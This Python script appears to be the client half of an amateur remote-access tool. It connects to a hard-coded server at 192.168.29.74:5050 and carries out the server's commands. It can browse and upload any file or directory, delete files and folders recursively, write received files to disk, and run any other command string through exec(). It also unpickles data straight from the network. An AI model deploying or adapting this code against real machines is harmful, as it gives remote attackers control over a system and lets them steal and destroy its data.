#import modules
import pickle
import socket
import os
import shutil
import tqdm
import platform
import subprocess


#fuctions
def send_response_text(response=None):
    response_encoded=response.encode(FORMAT)
    response_len=len(response_encoded)
    send_length=str(response_len).encode(FORMAT)
    send_length+=b' '*(HEADER-len(send_length))
    client.send(send_length)
    client.send(response_encoded)

def send_response_list(response):
    response_pickle=pickle.dumps(response)
    response_pickle_len=len(response_pickle)
    send_length=str(response_pickle_len).encode(FORMAT)
    send_length+=b' '*(HEADER-len(send_length))
    client.send(send_length)
    client.send(response_pickle)


def receive_command():
    comm_len=(client.recv(HEADER)).decode(FORMAT)
    comm_len=int(comm_len)
    command=(client.recv(comm_len)).decode(FORMAT)
    return command

def send_command(command):
    command_encoded=command.encode(FORMAT)
    command_len=len(command_encoded)
    send_length=str(command_len).encode(FORMAT)
    send_length+=b' '*(HEADER-len(send_length))
    client.send(send_length)
    client.send(command_encoded)
    # print(command_encoded)

def receive_response_dir():
    data_recv=0
    response_list_pickle=b''
    resp_list_len=(client.recv(HEADER)).decode(FORMAT)
    while resp_list_len:
        resp_list_len=int(resp_list_len)
        while True:
            print(data_recv)
            if data_recv>=resp_list_len:
                break
            response_list_pickle+=client.recv(BUFFER_SIZE)
            data_recv+=BUFFER_SIZE
        response_list=pickle.loads(response_list_pickle)
        return response_list



def send_file(file_path):
    filesize=os.path.getsize(file_path)
    response_encoded=f'{os.path.basename(file_path)}{SEPARATOR}{filesize}'.encode(FORMAT)
    response_len=len(response_encoded)
    send_length=str(response_len).encode(FORMAT)
    send_length+=b' '*(HEADER-len(send_length))
    client.send(send_length)
    client.send(response_encoded)
    with open(file_path,'rb') as f:
        while True:
            bytes_read=f.read(BUFFER_SIZE)
            if not bytes_read:
                break
            client.sendall(bytes_read)
    client.recv(4)

def send_dir(dir_path):
    dir_file_dic={}
    for dirpath,_,filenames in os.walk(os.path.basename(dir_path)):
        dir_file_dic.update({dirpath:filenames})
    send_response_list(dir_file_dic)
    protocol_completion=receive_command()
    if protocol_completion=='protocol completed successfully':
        for dir,filenames in dir_file_dic.items():
            if bool(filenames):
                for filename in filenames:
                    path_file=os.path.join(dir,filename)
                    send_file(path_file)
    else:
        pass

def receive_file(main_path='extraction'):
    bytes_received=0
    comm_len=(client.recv(HEADER)).decode(FORMAT)
    comm_len=int(comm_len)
    command=(client.recv(comm_len)).decode(FORMAT)
    file_name,filesize=command.split(SEPARATOR)
    filesize=int(filesize)
    progress = tqdm.tqdm(range(filesize), f"Receiving {file_name}", unit="B", unit_scale=True, unit_divisor=1024)
    with open(f'{main_path}/{file_name}', "wb") as f:
        while True:
            if bytes_received==filesize:    
                break
            bytes_read = client.recv(BUFFER_SIZE)
            bytes_received+=len(bytes_read)
            f.write(bytes_read)
            progress.update(len(bytes_read))
    client.send('done'.encode('utf-8'))

def receive_dir():
    dir_dic=receive_response_dir()
    if os.path.basename(os.getcwd())!='extraction':
        os.chdir('extraction')
    if os.path.exists(list(dir_dic.keys())[0]):
        if input('Enter (y) if you want to overwrite the folder \n')=='y':
            shutil.rmtree(list(dir_dic.keys())[0])
            send_command('protocol completed successfully')       
            for dir in dir_dic:
                os.mkdir(dir)
            for dir,filenames in dir_dic.items():
                if bool(filenames):
                    for filename in filenames:
                        receive_file(main_path=dir)
                        
        else:
            send_command('aboard')
            print('File already exists please try again!')
    else:
        send_command('protocol completed successfully')       
        for dir in dir_dic:
            os.mkdir(dir)
        for dir,filenames in dir_dic.items():
            if bool(filenames):
                for filename in filenames:
                    receive_file(main_path=dir)

    
#initialization

dirpath='/Users/shehzailabbas/Documents/sheets/socketttt/extraction/files'
filespath='/Users/shehzailabbas/Documents/sheets/socketttt/extraction'


SERVER='192.168.29.74'
PORT=5050
FORMAT='utf-8'
HEADER=64
ADDR=(SERVER,PORT)
SEPARATOR='<SEPARATOR>'
BUFFER_SIZE=4096
OS=platform.system()
client=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
client.connect(ADDR)
exec_response=''


def main_code(communication_type):
    while True:
        DIRECTOREIES=os.listdir()
        current_dir=os.getcwd()+'>'
        if communication_type=='1':
            send_response_list(DIRECTOREIES)
            send_response_text(current_dir)
        command=receive_command()
        command_list=[]
        if command=='switch':
            if communication_type=='1':
                main_code('2')
            else:
                main_code('1')
        # for i in range(len(command)+1):
        #     if ('get' in command[:i]) or ('cd' in command[:i]) or ('rm' in command[:i]):
        #         index=i
        #         break
        # command_list.append(command[0:index].strip())
        # command_list.append(command[index:len(command)+1].strip())
        command=command.strip()
        command_list=command.split(' ',1)
        for i in range(len(command_list)):
            command_list[i]=command_list[i].strip()
        if command=='help':
            pass
        elif command_list[0]=='cd':
            if command_list[1]=='..':
                path=os.path.split(os.getcwd())[0]
                os.chdir(path)
            else:
                path=os.path.join(os.getcwd(),command_list[1])
                try:
                    if path==os.getcwd():
                        os.chdir(command_list[1])
                    else:
                        os.chdir(path)
                except Exception as e:
                    print(e)
        elif command=='ls':
            pass
        elif command=='send':
            type=receive_command()
            if type=='file':
                receive_file()
            elif type=='dir':
                receive_dir()
        elif command=='com':
            with open("message.txt",'w') as f:
                pass
            if(OS=='Darwin'):
                mess='INITIALIZED'
                while(mess!="Q!"):
                    subprocess.call(("killall",'TextEdit'))
                    with open("message.txt",'a') as f:
                        f.write(mess)
                        f.write('\n')
                    subprocess.call(("open",'message.txt'))
                    mess=receive_command()
            elif(OS=='Windows'):
                pass
            else:
                pass
        elif command=='exit()' or command=='quit()':
            client.shutdown(1)
            client.close()
            exit(0)
        elif command_list[0]=='get':
            path=os.path.join(os.getcwd(),command_list[1])
            try:
                if not os.path.exists(path):
                    send_response_text("directory or the file specified doesn't exist")
                else:
                    send_response_text(str(os.path.isfile(path)))
                    if os.path.isdir(path):
                        send_dir(command_list[1])
                    elif os.path.isfile(path):
                        send_file(command_list[1])
            except:
                # print('OOPS!something went wrong')
                pass
        elif command_list[0]=='rm':
            path=os.path.join(os.getcwd(),command_list[1])
            try:
                if not os.path.exists(path):
                    send_response_text("directory or the file specified doesn't exist")
                else:
                    send_response_text(str(os.path.isfile(path)))
                    if os.path.isdir(path):
                        shutil.rmtree(path)
                    elif os.path.isfile(path):
                        os.remove(path)
            except:
                # print('OOPS!something went wrong')
                pass
        else:
            try:
                exec('exec_response='+command)
                print(exec_response,"response")
                if exec_response:
                    send_response_text(exec_response)
                else:
                    send_response_text('c')
                send_response_text('command executed')
            except:
                send_response_text('invalid command')

    
#main coding
communication_type=receive_command()
send_command(OS)
main_code(communication_type)

